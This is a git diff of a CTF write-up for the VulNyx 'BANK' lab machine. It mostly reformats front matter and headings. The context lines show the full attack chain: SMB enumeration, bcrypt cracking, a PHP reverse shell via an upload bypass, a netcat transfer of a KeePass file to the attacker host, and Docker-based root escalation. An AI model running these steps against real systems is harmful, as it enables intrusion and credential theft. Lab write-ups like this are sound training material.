@@ -1,21 +1,21 @@
 ---
-title: "Bank"
-date: 2026-06-09T21:10:28+05:30
-draft: false
-description: ""
-summary: ""
+title: "BANK - Vulnyx"
+date: 2026-06-18
+description: "VulNyx BANK writeup covering SMB enumeration, JWT analysis, file upload bypass, credential recovery, and Docker privilege escalation."
+summary: "Exploited anonymous SMB access, leaked JWT credentials, bypassed file upload restrictions for RCE, recovered KeePass credentials, and abused Docker group membership to gain root."
 platform: "vulnyx"
 difficulty: "easy"
 os: "Linux"
-featured_image: "/images/writeups/placeholder.svg"
-tags: [JWT,REC]
-categories: []
+status: "active"
+featured: true
+featured_image: "/images/writeups/vulnyx/bank.png"
+tags: ["smb", "jwt", "rce", "keepass", "docker", "privilege-escalation"]
+skills: ["nmap", "smbclient", "burp-suite", "john", "docker"]
+comments: false
+draft: false
 ---
 
----
-# [VulNyx](https://vulnyx.com/) – BANK Writeup
-
-<img width="671" height="426" alt="image" src="https://github.com/user-attachments/assets/9b4db2b3-4119-4c80-83f6-b70d05cde7c8" />
+<img width="842" height="438" alt="image" src="https://github.com/user-attachments/assets/8a3cdac8-2a51-4494-a2be-68549fa3c620" />
 
 ---
 
@@ -107,7 +107,7 @@ The SMB service appeared particularly interesting and was selected for further e
 
 ---
 
-# 🌐 Web Enumeration
+## 🌐 Web Enumeration
 
 Opening the website redirected the browser to:
 
@@ -135,7 +135,7 @@ This suggested that the application was still under development and might contai
 
 ---
 
-# 📂 Directory Enumeration
+## 📂 Directory Enumeration
 
 Use Gobuster to search for hidden directories:
 
@@ -143,7 +143,7 @@ Use Gobuster to search for hidden directories:
 gobuster dir -u http://bank.nyx -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ```
 
-## Result
+### Result
 
 ```text$ gobuster dir -u http://bank.nyx -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
 ===============================================================
@@ -171,7 +171,7 @@ No additional directories were discovered.
 
 ---
 
-# 🔍 SMB Enumeration
+## 🔍 SMB Enumeration
 
 Enumerate SMB shares anonymously:
 
@@ -179,7 +179,7 @@ Enumerate SMB shares anonymously:
 smbclient -L //172.29.112.170/ -N
 ```
 
-## Result
+### Result
 
 ```text
 $ smbclient -L //172.29.112.170/ -N
@@ -209,7 +209,7 @@ was accessible.
 
 ---
 
-# 📥 Accessing the SMB Share
+## 📥 Accessing the SMB Share
 
 Connect to the share:
 
@@ -248,7 +248,7 @@ mget *
 
 ---
 
-# 📄 Information Disclosure
+## 📄 Information Disclosure
 
 Reading the contents of `03-may-26.txt` revealed:
 
@@ -290,7 +290,7 @@ A login and registration portal was discovered.
 
 ---
 
-# 🔐 Account Registration
+## 🔐 Account Registration
 
 Register a new account and Login to the application.
 | Register | Login |
@@ -310,7 +310,7 @@ confirmed that the administrator account exists.
 
 ---
 
-# 🔍 JWT Analysis
+## 🔍 JWT Analysis
 
 Capture the verification Response using Burp Suite.
 Inspect the JWT token using the [JWT-Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd) extension.
@@ -333,7 +333,7 @@ for the administrator account.
 
 ---
 
-# 🔓 Password Cracking
+## 🔓 Password Cracking
 
 Extract the bcrypt hash and crack it using John the Ripper:
 
@@ -341,7 +341,7 @@ Extract the bcrypt hash and crack it using John the Ripper:
 john --format=bcrypt hash --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
-## Result
+### Result
 
 ```text
 $ john --format=bcrypt hash --wordlist=/usr/share/wordlists/rockyou.txt  
@@ -365,7 +365,7 @@ Password: blink182
 
 ---
 
-# 🔐 OTP Disclosure
+## 🔐 OTP Disclosure
 
 Login as the administrator using the Credentials .
 
@@ -390,7 +390,7 @@ Enter the OTP and successfully authenticate as the administrator.
 
 ---
 
-# 📤 File Upload Bypass
+## 📤 File Upload Bypass
 
 The administrator panel contained a profile update feature that allowed file uploads.
 
@@ -428,7 +428,7 @@ Although the application returned a **500 Internal Server Error**.
 
 ---
 
-# 🔍 Uploaded File Discovery
+## 🔍 Uploaded File Discovery
 
 Inspect subsequent requests and identify the uploads directory:
 
@@ -447,7 +447,7 @@ The PHP reverse shell file was uploaded successfully.
 
 ---
 
-# 🎧 Netcat Listener
+## 🎧 Netcat Listener
 
 Start a listener on the attacker machine:
 
@@ -457,11 +457,11 @@ nc -lvnp 443
 
 ---
 
-# 🚀 Remote Code Execution
+## 🚀 Remote Code Execution
 
 Trigger the uploaded PHP reverse shell.
 
-## Result
+### Result
 
 ```bash
 $ nc -lnvp 443
@@ -474,7 +474,7 @@ Successfully obtained a reverse shell as:
 
 ---
 
-# 🔧 Upgrading the Shell
+## 🔧 Upgrading the Shell
 
 Spawn a Bash shell:
 
@@ -510,7 +510,7 @@ The shell is now fully interactive.
 
 ---
 
-# 🔍 Sensitive Files Discovery
+## 🔍 Sensitive Files Discovery
 
 While enumerating directories, the following files were discovered:
 
@@ -525,7 +525,7 @@ Read the note.txt:
 cat note.txt
 ```
 
-## Result
+### Result
 
 ```text
 Hey, as you said Marcelo, I’ve already left a KeePass file with all the system passwords you asked me to create, except for the root password. 
@@ -544,17 +544,17 @@ The KeePass master password was disclosed.
 
 ---
 
-# 📥 Retrieving the KeePass Database
+## 📥 Retrieving the KeePass Database
 
 Transfer the database to the attacker machine.
 
-## On Target
+### On Target
 
 ```bash
 nc 172.29.112.76 4444 < passwords.kdbx
 ```
 
-## On Attacker
+### On Attacker
 
 ```bash
 nc -lvnp 4444 > passwords.kdbx
@@ -590,7 +590,7 @@ Password: m4rC1!#asl2#vsHj4!
 
 ---
 
-# 🖥 User Access
+## 🖥 User Access
 
 Switch to the Marcelo account:
 
@@ -605,7 +605,7 @@ Verify access:
 hostname ; id
 ```
 
-## Result
+### Result
 
 ```bash
  marcelo@bank:/srv/smb/passwords$ hostname ;id
@@ -625,7 +625,7 @@ group.
 
 ---
 
-# 📄 User Flag
+## 📄 User Flag
 
 ```bash
 cat /home/marcelo/user.txt
@@ -634,7 +634,7 @@ cat /home/marcelo/user.txt
 
 ---
 
-# 🚀 Privilege Escalation via Docker
+## 🚀 Privilege Escalation via Docker
 
 Enumerate available Docker images:
 
@@ -642,7 +642,7 @@ Enumerate available Docker images:
 docker images
 ```
 
-## Result
+### Result
 
 ```text
 marcelo@bank:/srv/smb/passwords$ docker images
@@ -660,7 +660,7 @@ docker run -v /:/host -it --rm debian:bookworm-slim chroot /host bash
 
 ---
 
-# 👑 Root Access
+## 👑 Root Access
 
 Verify privileges:
 
@@ -675,7 +675,7 @@ Successfully escalated privileges to root.
 
 ---
 
-# 🏁 Root Flag
+## 🏁 Root Flag
 
 
 ```bash
@@ -715,5 +715,3 @@ root@d9a79b7c88f0:/#
 - Membership in the Docker group effectively grants root-level access to the host.
 
 ---
-
-## **Author:** [zer0arc4](https://github.com/zer0arc4)
